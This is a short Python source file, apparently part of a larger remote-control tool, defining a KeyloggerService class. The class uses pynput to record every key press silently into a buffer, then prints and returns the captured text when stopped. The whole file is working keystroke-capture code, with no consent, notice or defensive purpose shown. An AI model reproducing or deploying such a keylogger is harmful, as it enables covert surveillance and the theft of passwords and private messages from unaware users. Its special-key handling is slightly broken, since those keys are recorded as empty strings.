from pynput import keyboard
from threading import Lock


class KeyloggerService:

    def __init__(self):

        self._listener = None
        self._running = False
        self._buffer = []
        self._lock = Lock()

    # -------------------------

    def start(self):

        if self._running:
            return "Keylogger already running"

        self._buffer.clear()

        self._listener = keyboard.Listener(on_press=self._on_press)

        self._listener.start()

        self._running = True

        return "Keylogger started"

    # -------------------------

    def stop(self):

        if not self._running:
            return "Keylogger not running"

        self._listener.stop()

        self._running = False

        with self._lock:

            data = "".join(self._buffer)
            print("BUFFER:", data)
            self._buffer.clear()

        return data

    # -------------------------

    def _on_press(self, key):

        try:

            if hasattr(key, "char") and key.char:

                k = key.char

            else:

                k = ""

        except AttributeError:

            if hasattr(key, "name"):

                k = f"[{key.name}]"

            else:

                k = ""

        with self._lock:

            self._buffer.append(k)
